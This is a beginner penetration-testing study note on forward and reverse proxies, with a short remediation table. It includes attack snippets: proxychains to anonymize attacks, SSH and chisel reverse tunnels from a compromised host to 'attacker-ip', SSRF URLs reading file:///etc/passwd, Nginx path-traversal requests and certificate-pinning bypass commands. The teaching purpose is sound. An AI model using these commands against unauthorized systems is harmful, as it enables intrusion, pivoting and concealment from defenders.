---
tags: [vapt, foundations, networking, beginner]
difficulty: beginner
module: "01 - Foundations"
topic: "01.13 Proxies — Forward and Reverse"
---

# 01.13 — Proxies — Forward and Reverse

## What is it?

A **proxy** is an intermediary server that sits between a client and a server, forwarding requests on behalf of one of them. There are two fundamentally different types — they face opposite directions.

**Forward proxy:** Client-side intermediary. Client → Proxy → Server. The server sees the proxy, not the client.

**Reverse proxy:** Server-side intermediary. Client → Proxy → Backend Server. The client sees the proxy, not the backend.

---

## Forward Proxy

```
WITHOUT PROXY:
Client (192.168.1.100) ─────────────────────────────→ google.com
                             Server sees: 192.168.1.100

WITH FORWARD PROXY:
Client (192.168.1.100) → [Proxy: 10.0.0.1] ─────────→ google.com
                                                Server sees: 10.0.0.1
                         ↑ Client's IP is hidden from server

USE CASES:
- Corporate: control/monitor employee internet access
- Bypass censorship / geo-restrictions (VPN-like)
- Anonymity (Tor, SOCKS5 proxies)
- Security tools: Burp Suite intercept proxy
```

---

## Reverse Proxy

```
WITHOUT REVERSE PROXY:
Client ─────────────────────────────→ Backend App (192.168.1.50:8080)
         Client sees backend IP/port directly

WITH REVERSE PROXY:
Client ──────→ [Nginx/HAProxy: 10.0.0.1:443] → Backend (192.168.1.50:8080)
                    Client sees: 10.0.0.1:443 only

USE CASES:
- Hide backend servers (security)
- Load balancing
- SSL termination (HTTPS in, HTTP to backend)
- Caching (CDN-like)
- WAF (filter malicious requests)

EXAMPLES: Nginx, Apache, HAProxy, Cloudflare, AWS ALB/ELB
```

---

## How Burp Suite Works as a Proxy

```
Browser → [Burp Suite Proxy :8080] → Target Server

1. Configure browser to use proxy: 127.0.0.1:8080
2. Burp intercepts ALL HTTP/HTTPS requests
3. You can view, modify, forward, or drop each request
4. Enables manual testing of every parameter

HTTP FLOW:
  Browser sends:  GET /login HTTP/1.1
  Burp intercepts ← you see this in Burp's Proxy tab
  You modify:     Add parameter, change header, inject payload
  Burp forwards modified request to server
  Server responds → Burp intercepts response too
```

---

## Security Context — Proxies in VAPT

### 1. Intercepting Traffic with Burp Suite

```bash
# 1. Launch Burp Suite
burpsuite &

# 2. Configure browser proxy:
# Firefox: Settings → Manual Proxy → 127.0.0.1:8080
# Or use FoxyProxy extension

# 3. Import Burp CA certificate for HTTPS:
# Visit http://burp → Download CA Certificate
# Install in browser → now Burp can decrypt HTTPS

# 4. Start intercepting:
# Proxy → Intercept → Intercept is ON
# Browse target → requests pause in Burp → modify → Forward
```

### 2. Proxy Chaining — Anonymize Attacks

```bash
# proxychains — route tool traffic through SOCKS/HTTP proxies
# Config: /etc/proxychains4.conf
# Add to [ProxyList]:
socks5 127.0.0.1 9050    ← Tor
socks5 10.0.0.1 1080     ← corporate SOCKS proxy

# Use any tool through proxy chain:
proxychains nmap -sT target
proxychains curl https://target.com
proxychains python exploit.py

# SSH SOCKS proxy (tunnel through compromised host)
ssh -D 9050 user@pivot-host    ← creates SOCKS5 on localhost:9050
# Then proxychains routes through pivot-host
```

### 3. Reverse Proxy Misconfiguration — Backend Access

Reverse proxies route requests based on path. Misconfigurations can expose backend servers.

```
NGINX CONFIG (vulnerable):
location /api/ {
    proxy_pass http://internal-api:8080/;  ← proxies to backend
}

ATTACK: Path traversal through proxy
Request: GET /api/../../admin
Nginx might strip /api/ → send /../../admin → backend
Backend interprets as /admin → admin panel exposed!

ATTACK: Host header to reach internal backends
GET / HTTP/1.1
Host: internal-api:8080    ← bypass reverse proxy routing
```

### 4. SSRF via Open Proxy / Proxy Confusion

```
Some apps act as proxies for user-supplied URLs.
This is SSRF — see [[Module 13 - SSRF]] for full coverage.

Proxy functionality in apps:
  /proxy?url=http://target.com         ← legitimate use
  /proxy?url=http://internal.corp/admin ← SSRF!
  /proxy?url=file:///etc/passwd         ← LFI via SSRF!
```

### 5. Intercept Proxy for Mobile Apps / APIs

```bash
# Route mobile app traffic through Burp:
# 1. Set device proxy to your Burp machine IP:8080
# 2. Install Burp CA on device (System/User cert store)
# 3. For cert pinning bypass: use Frida or objection

# Frida bypass for Android:
frida -U -l frida-scripts/android/unpinning.js -f com.target.app

# objection for cert pinning bypass:
objection -g com.target.app explore
android sslpinning disable
```

### 6. Reverse Proxy Headers — Information Leakage

```http
Response Headers from reverse proxied app:
X-Powered-By: PHP/7.4        ← reveals backend language
X-Backend-Server: app01      ← reveals backend hostname!
Server: Apache/2.4.41        ← reveals backend web server
X-AspNet-Version: 4.0.30319  ← reveals .NET version

Via: 1.1 nginx (nginx/1.18.0)  ← proxy chain revealed

These headers reveal the backend stack → target for CVEs
```

---

## Hands-On: Proxy Tools

```bash
# Burp Suite (GUI)
burpsuite

# mitmproxy (terminal)
mitmproxy --listen-port 8080
mitmweb     ← web UI version

# squid (forward proxy)
apt install squid
# Config: /etc/squid/squid.conf

# redsocks — transparent proxy (route all traffic)
# Useful to proxy tools that don't support proxy settings

# chisel — HTTP tunneling (firewall bypass)
# Server side:
./chisel server --port 8080 --reverse
# Client side (on compromised host):
./chisel client attacker-ip:8080 R:socks
# Now SOCKS5 at attacker-ip:1080 → routes through victim
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Reverse proxy exposes backend headers | Strip backend headers (X-Powered-By, Server, Via) |
| Open forward proxy (anyone can use it) | Restrict proxy access to authenticated users |
| Proxy allows SSRF to internal services | Whitelist allowed destinations in proxy config |
| Backend reachable if proxy bypassed | Firewall backend to only accept traffic from proxy |
| Intercept proxy in production | Never run debug/intercept proxies in production |

---

## Related Notes
- [[12 - Firewalls How They Work]] — firewalls and proxies work together
- [[14 - Load Balancers]] — reverse proxy cousin
- [[Module 09 - HTTP Request Smuggling]] — proxy confusion attacks
- [[Module 13 - SSRF]] — server-side request forgery via proxy features
- [[Module 36 - WAF Bypass]] — bypassing reverse proxy WAFs
